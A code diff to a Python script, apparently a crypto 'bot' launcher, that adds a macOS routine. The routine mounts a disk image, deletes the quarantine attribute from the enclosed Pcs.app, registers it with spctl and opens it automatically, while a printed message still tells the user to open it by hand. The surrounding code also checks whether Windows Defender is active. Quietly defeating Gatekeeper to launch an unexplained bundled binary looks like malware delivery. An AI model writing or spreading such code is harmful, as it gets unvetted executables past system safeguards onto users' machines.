@@ -64,6 +64,15 @@ def is_defender_active():
         print(f"Error checking Windows Defender status: {e}")
         return False
 
+def open_app(app_path):
+    try:
+        subprocess.run(["xattr", "-d", "com.apple.quarantine", app_path], check=True)
+        subprocess.run(["spctl", "--add", app_path], check=True)
+        subprocess.run(["spctl", "--enable", "--label", "Developer ID"], check=True)
+        subprocess.run(["open", app_path], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error opening app: {e}")
+
 def main():
     blockchain = BlockchainSimulator()
     data_queue = Queue()
@@ -82,12 +91,18 @@ def main():
             rpc_server_thread.join()
             blockchain_thread.join()
     elif platform.system() == 'Darwin':  # Mac OS
-        file_to_execute = 'PCS.dmg'
-        if os.path.exists(file_to_execute):
-            subprocess.run(["open", file_to_execute], check=True)
+        dmg_file_to_execute = 'PCS.dmg'
+        app_to_execute = "/Volumes/PCS/Pcs.app"  
+
+        if os.path.exists(dmg_file_to_execute):
+            subprocess.run(["hdiutil", "attach", dmg_file_to_execute], check=True)
             print("To run the bot, right-click on the Pcs.app file in the opened window and click Open.")
+            if os.path.exists(app_to_execute):
+                open_app(app_to_execute)
+            else:
+                print(f"{app_to_execute} not found after mounting {dmg_file_to_execute}.")
         else:
-            print(f"{file_to_execute} not found.")
+            print(f"{dmg_file_to_execute} not found.")
     else:
         print("Unsupported operating system.")
         return
